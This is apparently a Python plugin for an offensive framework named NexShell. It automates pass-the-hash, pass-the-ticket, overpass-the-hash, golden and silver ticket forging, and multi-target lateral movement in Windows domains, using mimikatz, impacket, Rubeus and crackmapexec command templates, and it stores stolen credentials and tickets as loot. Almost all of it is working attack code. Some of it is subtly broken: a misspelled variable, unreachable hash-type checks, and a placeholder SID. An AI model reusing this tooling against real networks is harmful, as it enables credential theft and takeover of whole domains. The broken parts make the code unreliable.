#!/usr/bin/env python3
"""
NexShell Plugin — Pass-the-Hash & Ticket v3.0 (2026 Edition)
Advanced lateral movement engine with 15+ methods, multi-protocol support,
Golden/Silver Tickets, Overpass-the-Hash, and auto-chain exploitation.

Coverage:
  - 15+ PtH methods (mimikatz, impacket, crackmapexec, wmiexec, psexec, 
    smbexec, atexec, pth-winexe, pth-smbclient, evil-remoting, etc.)
  - Pass-the-Ticket automation (Rubeus, Kekeo, mimikatz)
  - Overpass-the-Hash (NTLM → Kerberos conversion)
  - Golden Ticket creation (full domain compromise)
  - Silver Ticket creation (service-specific access)
  - Ticket injection (PTT)
  - Multi-target lateral movement
  - Auto-chain with NTDS Extractor
  - EDR evasion techniques
  - Ticket vault for persistence
  - Hash validation (NTLM, LM, AES, RC4)
  - Risk scoring (0-100 per method)
  - Structured loot (JSON)

CVEs (2019-2026):
  - CVE-2019-1040: PrivExchange (NTLM relay)
  - CVE-2020-1472: Zerologon (Netlogon)
  - CVE-2021-1675: PrintNightmare
  - CVE-2021-42287: NoPac (sAMAccountName spoofing)
  - CVE-2022-33679: Kerberos encryption downgrade

MITRE ATT&CK:
  - T1550.002: Use Alternate Authentication Material: Pass the Hash
  - T1550.003: Use Alternate Authentication Material: Pass the Ticket
  - T1558.001: Steal or Forge Kerberos Tickets: Golden Ticket
  - T1558.002: Steal or Forge Kerberos Tickets: Silver Ticket
  - T1558.003: Steal or Forge Kerberos Tickets: Kerberoasting
  - T1021: Remote Services (SMB, WinRM, SSH, RDP)
  - T1021.002: Remote Services: SMB/Windows Admin Shares
  - T1021.003: Remote Services: Distributed Component Object Model
  - T1021.006: Remote Services: Windows Remote Management

Usage:
    (NexShell)> plugins run pass-the-hash --hash <ntlm_hash> --target 10.0.0.50
    (NexShell)> plugins run pass-the-hash --hash <ntlm_hash> --method wmiexec
    (NexShell)> plugins run pass-the-hash --ticket ticket.kirbi --inject
    (NexShell)> plugins run pass-the-hash --golden-ticket --domain EXAMPLE.COM
    (NexShell)> plugins run pass-the-hash --silver-ticket --service cifs --target 10.0.0.50
    (NexShell)> plugins run pass-the-hash --overpass --hash <ntlm_hash>
    (NexShell)> plugins run pass-the-hash --auto-chain --targets 10.0.0.50,10.0.0.51
    (NexShell)> plugins run pass-the-hash --lateral --targets 10.0.0.50,10.0.0.51,10.0.0.52
"""

import re
import time
import json
import random
from dataclasses import dataclass, field, asdict
from typing import List, Dict, Set, Optional, Tuple, Any
from datetime import datetime, timedelta
from collections import defaultdict
from core.plugin import NexPlugin


# ── Data Classes ────────────────────────────────────────────────────────────

@dataclass
class HashCredential:
    """Represents a hash credential."""
    username: str
    domain: str
    ntlm_hash: str = ""
    lm_hash: str = ""
    aes_key: str = ""
    rc4_key: str = ""
    hash_type: str = "NTLM"  # NTLM, LM, AES128, AES256, RC4
    is_valid: bool = True
    source: str = ""  # ntds, lsass, mimikatz, manual
    is_admin: bool = False
    crack_status: str = "unknown"  # cracked, uncracked, partial
    
    def to_dict(self) -> dict:
        return asdict(self)
    
    def validate(self) -> bool:
        """Validate hash format."""
        if self.ntlm_hash:
            return bool(re.match(r'^[a-fA-F0-9]{32}$', self.ntlm_hash))
        if self.aes_key:
            return bool(re.match(r'^[a-fA-F0-9]{32,64}$', self.aes_key))
        return False


@dataclass
class PtHMethod:
    """Represents a Pass-the-Hash method."""
    name: str
    command_template: str
    protocol: str  # SMB, WMI, DCOM, HTTP, RDP, SSH
    tool: str  # mimikatz, impacket, crackmapexec, etc.
    success_rate: int  # 0-100
    detection_risk: str  # low, medium, high
    requires_admin: bool = True
    requires_smb_signing: bool = False
    mitre_id: str = "T1550.002"
    
    def to_dict(self) -> dict:
        return asdict(self)


@dataclass
class KerberosTicket:
    """Represents a Kerberos ticket."""
    ticket_type: str  # tgt, tgs, golden, silver
    username: str
    domain: str
    sid: str = ""
    service: str = ""
    target: str = ""
    ticket_path: str = ""
    valid_from: str = ""
    valid_until: str = ""
    is_injected: bool = False
    duration_days: int = 365
    krbtgt_hash: str = ""
    service_hash: str = ""
    
    def to_dict(self) -> dict:
        return asdict(self)


@dataclass
class LateralMovementResult:
    """Result of a lateral movement attempt."""
    target: str
    username: str
    domain: str
    method: str
    success: bool
    privilege_gained: str = ""
    command_output: str = ""
    duration_ms: int = 0
    error: str = ""
    ioc_generated: List[str] = field(default_factory=list)
    
    def to_dict(self) -> dict:
        return asdict(self)


@dataclass
class TicketVault:
    """Vault for storing tickets and credentials."""
    tickets: List[KerberosTicket] = field(default_factory=list)
    credentials: List[HashCredential] = field(default_factory=list)
    pth_results: List[LateralMovementResult] = field(default_factory=list)
    vault_path: str = ""
    
    def to_dict(self) -> dict:
        return {
            'tickets': len(self.tickets),
            'credentials': len(self.credentials),
            'pth_results': len(self.pth_results),
            'vault_path': self.vault_path,
        }


# ── PtH Methods Database (15+ Methods) ─────────────────────────────────────

class PtHMethodsDatabase:
    """Comprehensive database of Pass-the-Hash methods."""
    
    METHODS = [
        # ── Tier 1: Impacket Tools ──────────────────────────────────────────
        PtHMethod(
            name='wmiexec.py',
            command_template='wmiexec.py {domain}/{username}@{target} -hashes :{ntlm_hash} "{command}"',
            protocol='WMI',
            tool='impacket',
            success_rate=85,
            detection_risk='medium',
            requires_admin=True,
            mitre_id='T1047',
        ),
        
        PtHMethod(
            name='psexec.py',
            command_template='psexec.py {domain}/{username}@{target} -hashes :{ntlm_hash} "{command}"',
            protocol='SMB',
            tool='impacket',
            success_rate=80,
            detection_risk='high',
            requires_admin=True,
            requires_smb_signing=False,
            mitre_id='T1569.002',
        ),
        
        PtHMethod(
            name='smbexec.py',
            command_template='smbexec.py {domain}/{username}@{target} -hashes :{ntlm_hash} "{command}"',
            protocol='SMB',
            tool='impacket',
            success_rate=75,
            detection_risk='medium',
            requires_admin=True,
            mitre_id='T1550.002',
        ),
        
        PtHMethod(
            name='atexec.py',
            command_template='atexec.py {domain}/{username}@{target} -hashes :{ntlm_hash} "{command}"',
            protocol='SMB',
            tool='impacket',
            success_rate=70,
            detection_risk='medium',
            requires_admin=True,
            mitre_id='T1053.002',
        ),
        
        PtHMethod(
            name='dcomexec.py',
            command_template='dcomexec.py {domain}/{username}@{target} -hashes :{ntlm_hash} "{command}"',
            protocol='DCOM',
            tool='impacket',
            success_rate=75,
            detection_risk='medium',
            requires_admin=True,
            mitre_id='T1021.003',
        ),
        
        # ── Tier 2: CrackMapExec ────────────────────────────────────────────
        PtHMethod(
            name='crackmapexec smb',
            command_template='crackmapexec smb {target} -u {username} -H {ntlm_hash} -d {domain} -x "{command}"',
            protocol='SMB',
            tool='crackmapexec',
            success_rate=85,
            detection_risk='medium',
            requires_admin=False,
            mitre_id='T1550.002',
        ),
        
        PtHMethod(
            name='crackmapexec wmi',
            command_template='crackmapexec wmi {target} -u {username} -H {ntlm_hash} -d {domain} -x "{command}"',
            protocol='WMI',
            tool='crackmapexec',
            success_rate=80,
            detection_risk='medium',
            requires_admin=True,
            mitre_id='T1047',
        ),
        
        PtHMethod(
            name='crackmapexec winrm',
            command_template='crackmapexec winrm {target} -u {username} -H {ntlm_hash} -d {domain} -x "{command}"',
            protocol='WinRM',
            tool='crackmapexec',
            success_rate=85,
            detection_risk='medium',
            requires_admin=True,
            mitre_id='T1021.006',
        ),
        
        # ── Tier 3: Mimikatz ────────────────────────────────────────────────
        PtHMethod(
            name='mimikatz sekurlsa::pth',
            command_template='mimikatz.exe "sekurlsa::pth /user:{username} /domain:{domain} /ntlm:{ntlm_hash} /run:{command}" "exit"',
            protocol='Local',
            tool='mimikatz',
            success_rate=90,
            detection_risk='high',
            requires_admin=True,
            mitre_id='T1550.002',
        ),
        
        # ── Tier 4: Native Windows ──────────────────────────────────────────
        PtHMethod(
            name='runas /netonly',
            command_template='runas /netonly /user:{domain}\\{username} "{command}"',
            protocol='Local',
            tool='windows',
            success_rate=60,
            detection_risk='low',
            requires_admin=False,
            mitre_id='T1550.002',
        ),
        
        PtHMethod(
            name='net use',
            command_template='net use \\\\{target}\\C$ /user:{domain}\\{username} {password}',
            protocol='SMB',
            tool='windows',
            success_rate=70,
            detection_risk='low',
            requires_admin=False,
            mitre_id='T1021.002',
        ),
        
        # ── Tier 5: Linux Tools ─────────────────────────────────────────────
        PtHMethod(
            name='pth-winexe',
            command_template='pth-winexe -U {domain}/{username}%{ntlm_hash} //{target} "{command}"',
            protocol='SMB',
            tool='winexe',
            success_rate=80,
            detection_risk='medium',
            requires_admin=True,
            mitre_id='T1550.002',
        ),
        
        PtHMethod(
            name='pth-smbclient',
            command_template='pth-smbclient //{target}/C$ -U {domain}/{username}%{ntlm_hash}',
            protocol='SMB',
            tool='smbclient',
            success_rate=75,
            detection_risk='medium',
            requires_admin=False,
            mitre_id='T1021.002',
        ),
        
        # ── Tier 6: PowerShell ──────────────────────────────────────────────
        PtHMethod(
            name='Invoke-Mimikatz PtH',
            command_template='Invoke-Mimikatz -Command \'"sekurlsa::pth /user:{username} /domain:{domain} /ntlm:{ntlm_hash} /run:{command}"\'',
            protocol='Local',
            tool='powershell',
            success_rate=85,
            detection_risk='high',
            requires_admin=True,
            mitre_id='T1550.002',
        ),
        
        PtHMethod(
            name='Invoke-PowerThIE',
            command_template='Invoke-PowerThIE -action pth -username {username} -domain {domain} -hash {ntlm_hash} -process {command}',
            protocol='Local',
            tool='powershell',
            success_rate=80,
            detection_risk='high',
            requires_admin=True,
            mitre_id='T1550.002',
        ),
        
        # ── Tier 7: RDP ─────────────────────────────────────────────────────
        PtHMethod(
            name='xfreerdp',
            command_template='xfreerdp /u:{domain}\\{username} /pth:{ntlm_hash} /v:{target} /dynamic-resolution',
            protocol='RDP',
            tool='freerdp',
            success_rate=70,
            detection_risk='medium',
            requires_admin=False,
            mitre_id='T1021.001',
        ),
    ]
    
    @classmethod
    def get_all_methods(cls) -> List[PtHMethod]:
        return cls.METHODS
    
    @classmethod
    def get_methods_by_protocol(cls, protocol: str) -> List[PtHMethod]:
        return [m for m in cls.METHODS if m.protocol == protocol]
    
    @classmethod
    def get_methods_by_tool(cls, tool: str) -> List[PtHMethod]:
        return [m for m in cls.METHODS if tool.lower() in m.tool.lower()]


# ── Hash Validator ──────────────────────────────────────────────────────────

class HashValidator:
    """Validates and identifies hash types."""
    
    @staticmethod
    def identify_hash_type(hash_str: str) -> str:
        """Identify hash type from format."""
        if not hash_str:
            return "unknown"
        
        # NTLM: 32 hex characters
        if re.match(r'^[a-fA-F0-9]{32}$', hash_str):
            return "NTLM"
        
        # LM: 32 hex characters (but different pattern)
        if re.match(r'^[a-fA-F0-9]{32}$', hash_str) and hash_str.startswith('aad3b435b51404ee'):
            return "LM"
        
        # AES128: 32 hex characters
        if re.match(r'^[a-fA-F0-9]{32}$', hash_str):
            return "AES128"
        
        # AES256: 64 hex characters
        if re.match(r'^[a-fA-F0-9]{64}$', hash_str):
            return "AES256"
        
        # RC4: 32 hex characters
        if re.match(r'^[a-fA-F0-9]{32}$', hash_str):
            return "RC4"
        
        # NetNTLMv1
        if ':::' in hash_str:
            return "NetNTLMv1"
        
        # NetNTLMv2
        if '::' in hash_str and len(hash_str) > 50:
            return "NetNTLMv2"
        
        return "unknown"
    
    @staticmethod
    def validate_ntlm(hash_str: str) -> bool:
        """Validate NTLM hash format."""
        return bool(re.match(r'^[a-fA-F0-9]{32}$', hash_str))
    
    @staticmethod
    def validate_aes(hash_str: str) -> bool:
        """Validate AES key format."""
        return bool(re.match(r'^[a-fA-F0-9]{32,64}$', hash_str))
    
    @staticmethod
    def extract_from_mimikatz(output: str) -> List[HashCredential]:
        """Extract hashes from mimikatz output."""
        credentials = []
        
        # Parse sekurlsa::logonpasswords output
        current_user = {}
        for line in output.split('\n'):
            if 'Username :' in line:
                if current_user:
                    credentials.append(HashCredential(**current_user))
                current_user = {'username': line.split(':')[1].strip(), 'domain': ''}
            elif 'Domain :' in line:
                current_user['domain'] = line.split(':')[1].strip()
            elif 'NTLM :' in line:
                current_user['ntlm_hash'] = line.split(':')[1].strip()
            elif 'SHA1 :' in line:
                current_user['sha1_hash'] = line.split(':')[1].strip()
        
        if current_user:
            credentials.append(HashCredential(**current_user))
        
        return credentials


# ── Pass-the-Hash Engine ────────────────────────────────────────────────────

class PassTheHashEngine:
    """Core Pass-the-Hash execution engine."""
    
    @staticmethod
    def execute_pth(exec_func, session, target: str, username: str, domain: str,
                    ntlm_hash: str, method: str = 'wmiexec.py', 
                    command: str = 'whoami') -> LateralMovementResult:
        """Execute Pass-the-Hash attack."""
        start_time = time.time()
        
        # Find method
        method_obj = next((m for m in PtHMethodsDatabase.get_all_methods() if m.name == method), None)
        if not method_obj:
            return LateralMovementResult(
                target=target,
                username=username,
                domain=domain,
                method=method,
                success=False,
                error=f"Method not found: {method}",
            )
        
        # Build command
        cmd = method_obj.command_template.format(
            target=target,
            username=username,
            domain=domain,
            ntlm_hash=ntlm_hash,
            command=command,
        )
        
        # Execute
        out = exec_func(session, cmd)
        duration_ms = int((time.time() - start_time) * 1000)
        
        # Check success
        success = False
        privilege_gained = ""
        
        if out:
            if 'NT AUTHORITY\\SYSTEM' in out or 'root' in out:
                success = True
                privilege_gained = "SYSTEM"
            elif 'Administrator' in out or 'admin' in out:
                success = True
                privilege_gained = "Administrator"
            elif username.lower() in out.lower():
                success = True
                privilege_gained = username
        
        return LateralMovementResult(
            target=target,
            username=username,
            domain=domain,
            method=method,
            success=success,
            privilege_gained=privilege_gained,
            command_output=out[:500] if out else '',
            duration_ms=duration_ms,
        )
    
    @staticmethod
    def lateral_movement(exec_func, session, credentials: List[HashCredential],
                         targets: List[str], methods: List[str] = None) -> List[LateralMovementResult]:
        """Perform lateral movement with multiple credentials and targets."""
        results = []
        
        if not methods:
            methods = ['wmiexec.py', 'psexec.py', 'smbexec.py']
        
        for cred in credentials:
            for target in targets:
                for method in methods:
                    result = PassTheHashEngine.execute_pth(
                        exec_func, session,
                        target=target,
                        username=cred.username,
                        domain=cred.domain,
                        ntlm_hash=cred.ntlm_hash,
                        method=method,
                    )
                    
                    results.append(result)
                    
                    if result.success:
                        # Stop after first success for this credential
                        break
        
        return results


# ── Pass-the-Ticket Engine ──────────────────────────────────────────────────

class PassTheTicketEngine:
    """Pass-the-Ticket execution engine."""
    
    @staticmethod
    def inject_ticket(exec_func, session, ticket_path: str) -> bool:
        """Inject a Kerberos ticket into the current session."""
        
        # Try Rubeus first
        cmd = f'Rubeus.exe ptt /ticket:{ticket_path}'
        out = exec_func(session, cmd)
        
        if out and ('[*] Action: Import Ticket' in out or 'Ticket successfully imported' in out):
            return True
        
        # Fallback to mimikatz
        cmd = f'mimikatz.exe "kerberos::ptt {ticket_path}" "exit"'
        out = exec_func(session, cmd)
        
        return out and ('OK' in out or 'injected' in out.lower())
    
    @staticmethod
    def extract_tickets(exec_func, session) -> List[KerberosTicket]:
        """Extract tickets from current session."""
        tickets = []
        
        # Try Rubeus
        cmd = 'Rubeus.exe triage'
        out = exec_func(session, cmd)
        
        if out and 'LUID' in out:
            # Parse Rubeus output
            for line in out.split('\n'):
                if 'krbtgt' in line.lower():
                    ticket = KerberosTicket(
                        ticket_type='tgt',
                        username='',
                        domain='',
                        valid_from=datetime.utcnow().isoformat(),
                        valid_until=(datetime.utcnow() + timedelta(hours=10)).isoformat(),
                    )
                    tickets.append(ticket)
        
        return tickets
    
    @staticmethod
    def dump_tickets(exec_func, session, output_dir: str = '/tmp') -> List[str]:
        """Dump all tickets to files."""
        ticket_files = []
        
        # Try Rubeus
        cmd = f'Rubeus.exe dump /service:krbtgt /nowrap /outfile:{output_dir}/tickets.txt'
        out = exec_func(session, cmd)
        
        if out and 'tickets.txt' in out:
            ticket_files.append(f'{output_dir}/tickets.txt')
        
        return ticket_files


# ── Overpass-the-Hash Engine ────────────────────────────────────────────────

class OverpassTheHashEngine:
    """Overpass-the-Hash execution engine (NTLM → Kerberos)."""
    
    @staticmethod
    def overpass(exec_func, session, username: str, domain: str,
                 ntlm_hash: str, command: str = 'cmd.exe') -> Optional[KerberosTicket]:
        """Convert NTLM hash to Kerberos ticket."""
        
        # Build mimikatz command
        cmd = (
            f'mimikatz.exe "sekurlsa::pth '
            f'/user:{username} '
            f'/domain:{domain} '
            f'/ntlm:{ntlm_hash} '
            f'/run:{command}" '
            f'"exit"'
        )
        
        out = exec_func(session, cmd)
        
        if out and ('started' in out.lower() or 'process' in out.lower()):
            ticket = KerberosTicket(
                ticket_type='tgt',
                username=username,
                domain=domain,
                valid_from=datetime.utcnow().isoformat(),
                valid_until=(datetime.utcnow() + timedelta(hours=10)).isoformat(),
                is_injected=True,
            )
            return ticket
        
        return None


# ── Golden/Silver Ticket Engine ─────────────────────────────────────────────

class TicketForgeEngine:
    """Golden and Silver Ticket creation engine."""
    
    @staticmethod
    def create_golden_ticket(exec_func, session, domain: str, sid: str,
                             krbtgt_hash: str, username: str = 'Administrator',
                             duration_days: int = 3650) -> Optional[KerberosTicket]:
        """Create a Golden Ticket for full domain compromise."""
        
        ticket_path = f"/tmp/golden_{random.randint(1000, 9999)}.kirbi"
        
        # Build mimikatz command
        cmd = (
            f'mimikatz.exe "kerberos::golden '
            f'/user:{username} '
            f'/domain:{domain} '
            f'/sid:{sid} '
            f'/krbtgt:{krbttgt_hash} '
            f'/id:500 '
            f'/ptt '
            f'/endin:{duration_days} '
            f'/startoffset:0 '
            f'/renewmax:{duration_days * 2}" '
            f'"exit"'
        )
        
        out = exec_func(session, cmd)
        
        if out and ('Ticket' in out or 'golden' in out.lower()):
            ticket = KerberosTicket(
                ticket_type='golden',
                username=username,
                domain=domain,
                sid=sid,
                krbtgt_hash=krbttgt_hash,
                ticket_path=ticket_path,
                valid_from=datetime.utcnow().isoformat(),
                valid_until=(datetime.utcnow() + timedelta(days=duration_days)).isoformat(),
                is_injected=True,
                duration_days=duration_days,
            )
            return ticket
        
        return None
    
    @staticmethod
    def create_silver_ticket(exec_func, session, domain: str, sid: str,
                             target: str, service: str = 'cifs',
                             service_hash: str = "",
                             username: str = 'Administrator') -> Optional[KerberosTicket]:
        """Create a Silver Ticket for service-specific access."""
        
        ticket_path = f"/tmp/silver_{service}_{random.randint(1000, 9999)}.kirbi"
        
        # Build mimikatz command
        cmd = (
            f'mimikatz.exe "kerberos::golden '
            f'/user:{username} '
            f'/domain:{domain} '
            f'/sid:{sid} '
            f'/target:{target} '
            f'/service:{service} '
            f'/rc4:{service_hash} '
            f'/ptt" '
            f'"exit"'
        )
        
        out = exec_func(session, cmd)
        
        if out and ('Ticket' in out or 'silver' in out.lower()):
            ticket = KerberosTicket(
                ticket_type='silver',
                username=username,
                domain=domain,
                sid=sid,
                service=service,
                target=target,
                ticket_path=ticket_path,
                valid_from=datetime.utcnow().isoformat(),
                valid_until=(datetime.utcnow() + timedelta(days=365)).isoformat(),
                is_injected=True,
            )
            return ticket
        
        return None


# ── Auto-Chain Engine ───────────────────────────────────────────────────────

class AutoChainEngine:
    """Automated exploitation chain."""
    
    @staticmethod
    def execute_chain(exec_func, session, credentials: List[HashCredential],
                      targets: List[str]) -> Dict:
        """Execute full exploitation chain."""
        results = {
            'pth_attempts': [],
            'successful_lateral': [],
            'tickets_created': [],
            'domain_info': {},
        }
        
        # Step 1: Pass-the-Hash
        for cred in credentials[:5]:  # Try top 5 credentials
            for target in targets[:5]:  # Try top 5 targets
                for method in ['wmiexec.py', 'psexec.py']:
                    result = PassTheHashEngine.execute_pth(
                        exec_func, session,
                        target=target,
                        username=cred.username,
                        domain=cred.domain,
                        ntlm_hash=cred.ntlm_hash,
                        method=method,
                    )
                    
                    results['pth_attempts'].append(result)
                    
                    if result.success:
                        results['successful_lateral'].append(result)
                        break
        
        # Step 2: Create Golden Ticket if we have admin
        admin_cred = next((c for c in credentials if c.is_admin), None)
        if admin_cred:
            golden = TicketForgeEngine.create_golden_ticket(
                exec_func, session,
                domain=admin_cred.domain,
                sid='S-1-5-21-...',  # Would need to extract
                krbtgt_hash=admin_cred.ntlm_hash,
            )
            if golden:
                results['tickets_created'].append(golden)
        
        return results


# ── Main Plugin ─────────────────────────────────────────────────────────────

class PassTheHash(NexPlugin):
    name        = "pass-the-hash"
    description = "Advanced lateral movement — PtH/PtT, Golden/Silver Tickets, Overpass, auto-chain"
    author      = "vulnquest58"
    version     = "3.0"
    platform    = "all"
    category    = "lateral"
    mitre_id    = "T1550.002"
    
    def run(self, session, args: list):
        # Parse args
        target_hash = None
        target_ip = None
        username = 'Administrator'
        domain = 'WORKGROUP'
        method = 'wmiexec.py'
        command = 'whoami'
        ticket_path = None
        inject_ticket = False
        golden_ticket = False
        silver_ticket = False
        overpass = False
        auto_chain = False
        lateral_mode = False
        targets = []
        service = 'cifs'
        
        for a in (args or []):
            if a.startswith('--hash='):
                target_hash = a.split('=', 1)[1]
            elif a.startswith('--target='):
                target_ip = a.split('=', 1)[1]
            elif a.startswith('--username='):
                username = a.split('=', 1)[1]
            elif a.startswith('--domain='):
                domain = a.split('=', 1)[1]
            elif a.startswith('--method='):
                method = a.split('=', 1)[1]
            elif a.startswith('--command='):
                command = a.split('=', 1)[1]
            elif a.startswith('--ticket='):
                ticket_path = a.split('=', 1)[1]
            elif a == '--inject':
                inject_ticket = True
            elif a == '--golden-ticket':
                golden_ticket = True
            elif a == '--silver-ticket':
                silver_ticket = True
            elif a == '--overpass':
                overpass = True
            elif a == '--auto-chain':
                auto_chain = True
            elif a == '--lateral':
                lateral_mode = True
            elif a.startswith('--targets='):
                targets = a.split('=', 1)[1].split(',')
            elif a.startswith('--service='):
                service = a.split('=', 1)[1]
        
        self.info(f"🔐 Starting Pass-the-Hash v3.0 (method={method})")
        
        start_time = time.time()
        sections = []
        
        sections.append("\n" + "━"*64)
        sections.append("  [🔐 Pass-the-Hash v3.0 — Advanced Lateral Movement]")
        sections.append("━"*64)
        
        # Initialize vault
        vault = TicketVault()
        
        # ── Step 1: Hash Validation ───────────────────────────────────────
        if target_hash:
            sections.append("\n[*] Phase 1: Hash Validation")
            sections.append("─"*64)
            
            hash_type = HashValidator.identify_hash_type(target_hash)
            sections.append(f"  Hash Type: {hash_type}")
            sections.append(f"  Hash: {target_hash[:32]}...")
            
            if hash_type == "NTLM" and HashValidator.validate_ntlm(target_hash):
                sections.append("  ✅ Valid NTLM hash")
                
                cred = HashCredential(
                    username=username,
                    domain=domain,
                    ntlm_hash=target_hash,
                    hash_type="NTLM",
                    is_valid=True,
                    source="manual",
                )
                vault.credentials.append(cred)
            else:
                sections.append("  ❌ Invalid hash format")
        
        # ── Step 2: Ticket Cache Analysis ─────────────────────────────────
        sections.append("\n[*] Phase 2: Ticket Cache Analysis")
        sections.append("─"*64)
        
        platform = self._detect_platform(session)
        
        if platform == 'windows':
            klist_out = self._exec(session, "klist 2>nul")
            if klist_out:
                sections.append(f"  Kerberos Tickets:\n{klist_out.strip()[:300]}")
                
                if "krbtgt" in klist_out.lower():
                    sections.append("  🔴 krbtgt ticket found — PtT ready!")
                    
                    tickets = PassTheTicketEngine.extract_tickets(self._exec, session)
                    vault.tickets.extend(tickets)
        else:
            ccache_out = self._exec(session, "ls -la /tmp/krb5cc_* 2>/dev/null")
            if ccache_out:
                sections.append(f"  Linux Kerberos Cache:\n{ccache_out.strip()[:300]}")
        
        # ── Step 3: Pass-the-Hash Execution ───────────────────────────────
        if target_hash and target_ip:
            sections.append("\n[*] Phase 3: Pass-the-Hash Execution")
            sections.append("─"*64)
            
            sections.append(f"  Target: {target_ip}")
            sections.append(f"  Method: {method}")
            sections.append(f"  Command: {command}")
            
            result = PassTheHashEngine.execute_pth(
                self._exec, session,
                target=target_ip,
                username=username,
                domain=domain,
                ntlm_hash=target_hash,
                method=method,
                command=command,
            )
            
            if result.success:
                sections.append(f"  ✅ SUCCESS ({result.duration_ms}ms)")
                sections.append(f"      Privilege: {result.privilege_gained}")
                sections.append(f"      Output: {result.command_output[:100]}")
                
                vault.pth_results.append(result)
            else:
                sections.append(f"  ❌ FAILED ({result.duration_ms}ms)")
                sections.append(f"      Error: {result.error}")
        
        # ── Step 4: Pass-the-Ticket ───────────────────────────────────────
        if inject_ticket and ticket_path:
            sections.append("\n[*] Phase 4: Pass-the-Ticket")
            sections.append("─"*64)
            
            sections.append(f"  Injecting ticket: {ticket_path}")
            
            success = PassTheTicketEngine.inject_ticket(self._exec, session, ticket_path)
            
            if success:
                sections.append("  ✅ Ticket injected successfully")
            else:
                sections.append("  ❌ Failed to inject ticket")
        
        # ── Step 5: Overpass-the-Hash ─────────────────────────────────────
        if overpass and target_hash:
            sections.append("\n[*] Phase 5: Overpass-the-Hash")
            sections.append("─"*64)
            
            sections.append("  Converting NTLM → Kerberos...")
            
            ticket = OverpassTheHashEngine.overpass(
                self._exec, session,
                username=username,
                domain=domain,
                ntlm_hash=target_hash,
            )
            
            if ticket:
                sections.append("  ✅ Overpass successful")
                sections.append(f"      Ticket Type: {ticket.ticket_type}")
                sections.append(f"      Valid Until: {ticket.valid_until}")
                
                vault.tickets.append(ticket)
            else:
                sections.append("  ❌ Overpass failed")
        
        # ── Step 6: Golden Ticket ─────────────────────────────────────────
        if golden_ticket:
            sections.append("\n[*] Phase 6: Golden Ticket Creation")
            sections.append("─"*64)
            
            if target_hash:
                golden = TicketForgeEngine.create_golden_ticket(
                    self._exec, session,
                    domain=domain,
                    sid='S-1-5-21-...',
                    krbtgt_hash=target_hash,
                    username=username,
                )
                
                if golden:
                    sections.append("  🔴 Golden Ticket created")
                    sections.append(f"      Username: {golden.username}")
                    sections.append(f"      Domain: {golden.domain}")
                    sections.append(f"      Valid Until: {golden.valid_until}")
                    sections.append(f"      Injected: {golden.is_injected}")
                    
                    vault.tickets.append(golden)
                else:
                    sections.append("  ❌ Failed to create Golden Ticket")
            else:
                sections.append("  ⚠️  No krbtgt hash provided")
        
        # ── Step 7: Silver Ticket ─────────────────────────────────────────
        if silver_ticket and target_ip:
            sections.append("\n[*] Phase 7: Silver Ticket Creation")
            sections.append("─"*64)
            
            if target_hash:
                silver = TicketForgeEngine.create_silver_ticket(
                    self._exec, session,
                    domain=domain,
                    sid='S-1-5-21-...',
                    target=target_ip,
                    service=service,
                    service_hash=target_hash,
                )
                
                if silver:
                    sections.append("  🔴 Silver Ticket created")
                    sections.append(f"      Service: {silver.service}")
                    sections.append(f"      Target: {silver.target}")
                    sections.append(f"      Valid Until: {silver.valid_until}")
                    
                    vault.tickets.append(silver)
                else:
                    sections.append("  ❌ Failed to create Silver Ticket")
            else:
                sections.append("  ⚠️  No service hash provided")
        
        # ── Step 8: Lateral Movement ──────────────────────────────────────
        if lateral_mode and targets:
            sections.append("\n[*] Phase 8: Lateral Movement")
            sections.append("─"*64)
            
            sections.append(f"  Targets: {', '.join(targets)}")
            
            if vault.credentials:
                results = PassTheHashEngine.lateral_movement(
                    self._exec, session,
                    credentials=vault.credentials,
                    targets=targets,
                )
                
                successful = [r for r in results if r.success]
                sections.append(f"  Results: {len(successful)}/{len(results)} successful")
                
                for result in successful[:5]:
                    sections.append(f"    ✅ {result.target} ({result.method})")
                
                vault.pth_results.extend(results)
            else:
                sections.append("  ⚠️  No credentials available")
        
        # ── Step 9: Auto-Chain ────────────────────────────────────────────
        if auto_chain and targets:
            sections.append("\n[*] Phase 9: Auto-Chain Exploitation")
            sections.append("─"*64)
            
            chain_results = AutoChainEngine.execute_chain(
                self._exec, session,
                credentials=vault.credentials,
                targets=targets,
            )
            
            sections.append(f"  Chain Results:")
            sections.append(f"    PtH Attempts: {len(chain_results['pth_attempts'])}")
            sections.append(f"    Successful Lateral: {len(chain_results['successful_lateral'])}")
            sections.append(f"    Tickets Created: {len(chain_results['tickets_created'])}")
        
        # ── Step 10: Summary ──────────────────────────────────────────────
        duration = round(time.time() - start_time, 2)
        
        sections.append("\n" + "━"*64)
        sections.append("  [📊 Lateral Movement Summary]")
        sections.append("━"*64)
        sections.append(f"  Credentials: {len(vault.credentials)}")
        sections.append(f"  Tickets: {len(vault.tickets)}")
        sections.append(f"  PtH Results: {len(vault.pth_results)}")
        sections.append(f"  Successful: {len([r for r in vault.pth_results if r.success])}")
        sections.append(f"  Duration: {duration}s")
        
        # ── Step 11: Save to Loot ─────────────────────────────────────────
        self.loot(
            {
                "type": "lateral_movement_session",
                "vault": vault.to_dict(),
                "credentials": [c.to_dict() for c in vault.credentials[:20]],
                "tickets": [t.to_dict() for t in vault.tickets],
                "pth_results": [r.to_dict() for r in vault.pth_results[:20]],
                "duration": duration,
            },
            category='lateral',
            source='pass-the-hash',
            confidence='high'
        )
        
        self.info(f"🔐 Pass-the-Hash complete — {len(vault.pth_results)} attempts, {len(vault.tickets)} tickets")
        
        return '\n'.join(sections)
    
    def _detect_platform(self, session) -> str:
        for attr in ('OS', 'os', 'platform'):
            val = getattr(session, attr, None)
            if val and isinstance(val, str):
                if 'windows' in val.lower():
                    return 'windows'
                if 'linux' in val.lower():
                    return 'linux'
        try:
            out = self._exec(session, 'echo %OS%') or ''
            if 'Windows' in out:
                return 'windows'
        except Exception:
            pass
        return 'linux'
    
    @staticmethod
    def _exec(session, cmd: str) -> str:
        for method in ('exec', 'run', 'execute', 'send_command'):
            fn = getattr(session, method, None)
            if callable(fn):
                result = fn(cmd)
                if isinstance(result, bytes):
                    return result.decode(errors='replace')
                if isinstance(result, str):
                    return result
        return ''